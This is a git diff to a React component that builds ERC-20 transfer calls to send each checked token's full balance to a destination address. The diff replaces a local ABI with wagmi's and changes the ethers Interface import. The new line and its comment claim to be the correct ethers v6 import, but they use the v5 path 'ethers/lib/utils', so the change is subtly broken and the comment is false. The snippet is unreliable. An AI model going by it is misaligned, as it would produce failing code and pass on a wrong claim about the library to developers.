@@ -4,7 +4,8 @@ import { useWalletClient, usePublicClient } from 'wagmi';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
-import { ethers } from 'ethers';  // Importation de ethers.js
+import { erc20ABI } from 'wagmi';
+import { Interface } from 'ethers/lib/utils';  // Importation correcte de Interface pour ethers v6
 
 // Intégration avec l'API Etherscan pour récupérer les frais de gas
 const getGasPriceFromEtherscan = async () => {
@@ -20,13 +21,6 @@ const getGasPriceFromEtherscan = async () => {
     throw new Error("Erreur lors de la récupération des frais de gas");
   }
 };
-
-// ABI ERC-20 standard
-const erc20ABI = [
-  "function transfer(address recipient, uint256 amount) public returns (bool)",
-  "function approve(address spender, uint256 amount) public returns (bool)",
-  "function balanceOf(address account) public view returns (uint256)"
-];
 
 export const SendTokens = () => {
   const [tokens] = useAtom(globalTokensAtom);
@@ -75,8 +69,8 @@ export const SendTokens = () => {
       if (!token) return;
 
       try {
-        // Utilisation d'ethers.js pour encoder les données de la fonction
-        const iface = new ethers.utils.Interface(erc20ABI);
+        // Utilisation d'ethers.js v6 pour encoder les données de la fonction
+        const iface = new Interface(erc20ABI); // Utiliser Interface de ethers/lib/utils
         const data = iface.encodeFunctionData('transfer', [
           destinationAddress as `0x${string}`,
           BigInt(token.balance),
